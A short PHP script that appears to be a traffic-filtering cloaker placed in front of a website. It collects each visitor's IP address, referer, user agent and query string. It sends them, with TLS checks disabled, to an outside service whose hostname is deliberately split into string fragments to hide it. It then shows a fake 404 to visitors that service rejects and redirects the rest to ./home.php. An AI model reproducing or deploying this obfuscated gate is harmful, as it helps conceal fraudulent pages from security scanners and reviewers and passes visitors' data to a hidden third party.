<?php
  $y3 = "lgjqmli9ez6bol55";

  if (!function_exists("trueip")) {
      function i0()
      {
          if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"]) && $_SERVER["HTTP_CF_CONNECTING_IP"] != "127.0.0.1" && $_SERVER["HTTP_CF_CONNECTING_IP"] != $_SERVER["SERVER_ADDR"]) {
              $z4 = $_SERVER["HTTP_CF_CONNECTING_IP"];
          } elseif (!empty($_SERVER["GEOIP_ADDR"]) && $_SERVER["GEOIP_ADDR"] != "127.0.0.1") {
              $z4 = $_SERVER["GEOIP_ADDR"];
          } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]) && $_SERVER["HTTP_X_FORWARDED_FOR"] != "127.0.0.1" && $_SERVER["HTTP_X_FORWARDED_FOR"] != $_SERVER["SERVER_ADDR"]) {
              $z4 = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
          } elseif (!empty($_SERVER["HTTP_CLIENT_IP"]) && $_SERVER["HTTP_CLIENT_IP"] != "127.0.0.1" && $_SERVER["HTTP_CLIENT_IP"] != $_SERVER["SERVER_ADDR"]) {
              $z4 = $_SERVER["HTTP_CLIENT_IP"];
          } else {
              $z4 = $_SERVER["REMOTE_ADDR"];
          }
          return $z4;
      }
  }

  $z4 = i0();

  if (!function_exists("truer")) {
      function b1()
      {
          if (empty($_SERVER["HTTP_REFERER"])) {
              $_SERVER["HTTP_REFERER"] = getenv("HTTP_REFERER");
          }
          return $_SERVER["HTTP_REFERER"];
      }
  }

  $v5 = b1();

  if (!function_exists("trueua")) {
      function u2()
      {
          if (empty($_SERVER["HTTP_USER_AGENT"])) {
              $_SERVER["HTTP_USER_AGENT"] = getenv("HTTP_USER_AGENT");
          }
          return $_SERVER["HTTP_USER_AGENT"];
      }
  }

  $i6 = u2();

  if ($_SERVER["QUERY_STRING"] != "") {
      $c7 = "" . urlencode($_SERVER["QUERY_STRING"]) . "";
  } else {
      $c7 = "";
  }

  $j8 = $_SERVER["SERVER_ADDR"];
  $r9 = substr(@$_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2);
  $u10 = "ap";
  $v11 = "ch";
  $n12 = "";
  $b13 = "p.an";
  $u14 = "om";
  $r15 = "q903629";
  $r16 = "oshi";
  $x17 = "eld.c";
  $g18 = "i";

  $u19 = curl_init();
  curl_setopt($u19, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($u19, CURLOPT_URL, "https://" . $u10 . $b13 . $r16 . $x17 . $u14 . "/" . $u10 . $g18);
  curl_setopt($u19, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($u19, CURLOPT_TIMEOUT, 333);
  curl_setopt($u19, CURLOPT_POST, true);
  curl_setopt($u19, CURLOPT_POSTFIELDS, "key=" . $y3 . "&svip=" . $j8 . "&fd=" . $r15 . "&ip=" . $z4 . "&ref=" . $v5 . "&ua=" . $i6 . "&data=" . $c7 . "&sourceid=" . $n12 . "&sourcename=" . $v11 . "");
  $k20 = curl_exec($u19);
  curl_close($u19);

  if ($k20 == "0") {
      header_remove();
      header("Connection: close");
      header("HTTP/1.1 404 Not Found");
      $j21 = false;
      die();
  }

  header("Location: ./home.php")
  
?>